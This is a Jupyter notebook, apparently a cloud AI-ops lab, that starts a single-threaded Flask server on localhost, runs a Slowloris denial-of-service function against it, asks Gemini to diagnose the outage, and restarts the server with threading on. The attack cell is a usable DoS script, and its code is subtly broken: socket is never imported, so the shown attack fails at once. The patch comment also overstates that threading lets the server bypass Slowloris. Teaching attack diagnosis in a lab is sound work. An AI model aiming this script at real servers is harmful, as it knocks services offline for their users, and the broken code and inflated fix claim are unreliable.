{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5864122-d9ec-4b13-b080-7939d0af1fe4",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install --upgrade google-cloud-aiplatform --quiet\n",
    "!gcloud services enable aiplatform.googleapis.com\n",
    "import vertexai\n",
    "from vertexai.generative_models import GenerativeModel\n",
    "import subprocess\n",
    "\n",
    "# --- CONFIGURE THESE ---\n",
    "PROJECT_ID = \"YOUR_PROJECT_ID\"  # Replace with your GCP Project ID\n",
    "LOCATION = \"us-central1\"\n",
    "\n",
    "vertexai.init(project=PROJECT_ID, location=LOCATION)\n",
    "model = GenerativeModel(\"gemini-1.5-flash\")\n",
    "\n",
    "print(f\"Gemini API Initialized for project {PROJECT_ID}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ea5e2fa-c043-4f40-a185-a8fd8e740058",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install Flask --quiet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59cfce5d-2a0e-49e8-b9fa-5b1f6d5725f3",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "with open('app.py', 'w') as f:\n",
    "    f.write(\"\"\"\n",
    "from flask import Flask\n",
    "import time\n",
    "\n",
    "app = Flask(__name__)\n",
    "\n",
    "@app.route('/')\n",
    "def home():\n",
    "    # Simulate a small processing delay\n",
    "    return \"<h1>System Status: Healthy</h1><p>Server is responding to requests.</p>\"\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    # threaded=False is key here; it makes the server handle only one request at a time\n",
    "    app.run(host='0.0.0.0', port=5000, threaded=False)\n",
    "\"\"\")\n",
    "\n",
    "\n",
    "server_proc = subprocess.Popen(['python', 'app.py'])\n",
    "\n",
    "print(\"Web Server starting on http://localhost:5000\")\n",
    "print(\"Action: Go to 'Tools' -> 'UI Preview' and enter port 5000 to see the live site.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7018845-7120-4a42-94d0-bd6b8ceb7c91",
   "metadata": {},
   "outputs": [],
   "source": [
    "def run_slowloris_attack():\n",
    "    target_ip = \"127.0.0.1\"\n",
    "    port = 5000\n",
    "    connections = 100\n",
    "    sockets = []\n",
    "\n",
    "    print(f\"Starting attack: Opening {connections} 'slow' connections...\")\n",
    "    \n",
    "    for i in range(connections):\n",
    "        try:\n",
    "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "            s.settimeout(4)\n",
    "            s.connect((target_ip, port))\n",
    "            # Send partial headers to keep the connection open\n",
    "            s.send(f\"GET /?{time.time()} HTTP/1.1\\r\\n\".encode(\"utf-8\"))\n",
    "            s.send(\"Host: localhost\\r\\n\".encode(\"utf-8\"))\n",
    "            sockets.append(s)\n",
    "            if i % 20 == 0: print(f\"Held {i} connections...\")\n",
    "        except Exception as e:\n",
    "            print(f\"Connection failed: {e}\")\n",
    "            break\n",
    "            \n",
    "    print(\"--- ATTACK ACTIVE ---\")\n",
    "    print(\"Action: Try refreshing your UI Preview. It should now be unresponsive.\")\n",
    "    return sockets\n",
    "\n",
    "active_attack_sockets = run_slowloris_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "49641ee5-b92d-46b2-9d56-b537d89d54dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check_server_health():\n",
    "    try:\n",
    "        # Use curl to check if the server responds within 3 seconds\n",
    "        result = subprocess.check_output(['curl', '--max-time', '3', 'http://localhost:5000'], stderr=subprocess.STDOUT)\n",
    "        return True, result.decode()\n",
    "    except Exception:\n",
    "        return False, \"Request Timed Out\"\n",
    "\n",
    "is_healthy, response_text = check_server_health()\n",
    "\n",
    "if not is_healthy:\n",
    "    print(\"ALERT: Server is unresponsive! Consulting Gemini for AIOps assistance...\")\n",
    "    \n",
    "    # We provide Gemini with context about the environment and the symptoms\n",
    "    prompt = f\"\"\"\n",
    "    SITUATION:\n",
    "    - Web server is unresponsive (Timeout).\n",
    "    - Current infrastructure: Flask development server (app.py).\n",
    "    - Monitoring data: {len(active_attack_sockets)} active TCP connections from localhost.\n",
    "    - Server code snippet: `app.run(host='0.0.0.0', port=5000, threaded=False)`\n",
    "    \n",
    "    TASK:\n",
    "    1. Identify the type of attack occurring.\n",
    "    2. Explain why the current 'threaded=False' setting is causing the failure.\n",
    "    3. Provide the specific code change to make the server more resilient.\n",
    "    \"\"\"\n",
    "    \n",
    "    ai_response = model.generate_content(prompt)\n",
    "    print(\"\\n--- GEMINI SRE ANALYSIS ---\")\n",
    "    print(ai_response.text)\n",
    "    \n",
    "    # Cleanup to restore system\n",
    "    for s in active_attack_sockets: s.close()\n",
    "    server_proc.terminate()\n",
    "    print(\"\\n[MIGRATION]: Attack sockets closed. Server process terminated for patching.\")\n",
    "else:\n",
    "    print(\"Server is still healthy. No action needed.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3211963b-e168-4b63-8b82-a926772a0ffc",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create the patched (fixed) app file\n",
    "with open('app_patched.py', 'w') as f:\n",
    "    f.write(\"\"\"\n",
    "from flask import Flask\n",
    "app = Flask(__name__)\n",
    "\n",
    "@app.route('/')\n",
    "def home():\n",
    "    return \"<h1>System Status: FIXED</h1><p>Gemini applied 'threaded=True'. I can now handle multiple connections!</p>\"\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    # Gemini's Fix: threaded=True allows the server to bypass Slowloris clogs\n",
    "    app.run(host='0.0.0.0', port=5000, threaded=True)\n",
    "\"\"\")\n",
    "\n",
    "# Start the NEW server\n",
    "patched_server_proc = subprocess.Popen(['python', 'app_patched.py'])\n",
    "print(\"Patched Server starting... Check your UI Preview now!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e11d07a-4e49-4d55-a19e-01fc5ee0aa32",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Final cleanup\n",
    "try:\n",
    "    server_proc.terminate()\n",
    "    for s in active_attack_sockets:\n",
    "        s.close()\n",
    "    print(\"Lab cleanup complete. All background processes stopped.\")\n",
    "except:\n",
    "    pass"
   ]
  }
 ],
 "metadata": {
  "environment": {
   "kernel": "conda-base-py",
   "name": "workbench-notebooks.m138",
   "type": "gcloud",
   "uri": "us-docker.pkg.dev/deeplearning-platform-release/gcr.io/workbench-notebooks:m138"
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel) (Local)",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
